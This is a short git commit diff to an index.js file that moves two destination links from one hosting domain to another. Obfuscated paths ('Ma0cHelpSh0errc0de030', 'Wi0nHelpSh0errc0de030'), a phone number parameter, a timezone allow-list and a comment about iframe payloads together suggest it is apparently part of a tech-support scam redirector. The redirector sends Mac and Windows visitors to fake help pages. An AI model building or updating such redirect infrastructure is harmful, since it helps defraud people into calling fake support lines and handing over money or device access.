1dbe81aa81a311e1203d54b721997e91ceb1913e
paalakash <palaksh452@gmail.com>
2026-06-24 07:05:19 +0530

    Update index.js

--- index.js
+++ index.js
@@ -42,8 +42,8 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Destination Links
-const LINK_MAC = "https://hsdbjfvdgsfgdsy.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1800-034-661";
-const LINK_OTHERS = "https://hsdbjfvdgsfgdsy.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
+const LINK_MAC = "https://oyster-app-ciif4.ondigitalocean.app/Ma0cHelpSh0errc0de030/index.html?Anph=1800-034-661";
+const LINK_OTHERS = "https://oyster-app-ciif4.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
 
 // --- Pre-Compilation Cache Layer ---
 // Helper to generate identical iframe payloads dynamically on boot
